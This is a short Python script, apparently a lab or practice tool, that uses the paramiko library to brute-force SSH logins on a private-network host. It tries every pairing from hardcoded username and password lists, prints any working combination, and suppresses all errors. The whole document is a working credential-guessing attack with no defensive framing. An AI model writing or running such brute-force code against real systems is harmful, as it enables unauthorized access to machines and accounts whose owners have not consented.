import paramiko

def ssh_bruteforce():
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    username_list = ['djsadasdas','dasdsada','312312312','djsasdas','dsdsada','3123122','typhoon']
    password_list = ['passowrd','982339012','789456123','passdasdasowrd','982333242349012','78945dsadas6123','789456123']
    for i in username_list:
        for j in password_list:
            try:
                sonuc = client.connect("192.168.1.41",username=i,password=j)
                client.close()
                print("Username: ",i," Password: ",j)
            except BaseException as e:
                pass

if __name__ == "__main__":
    try:
        ssh_bruteforce()
    except BaseException as e:
        pass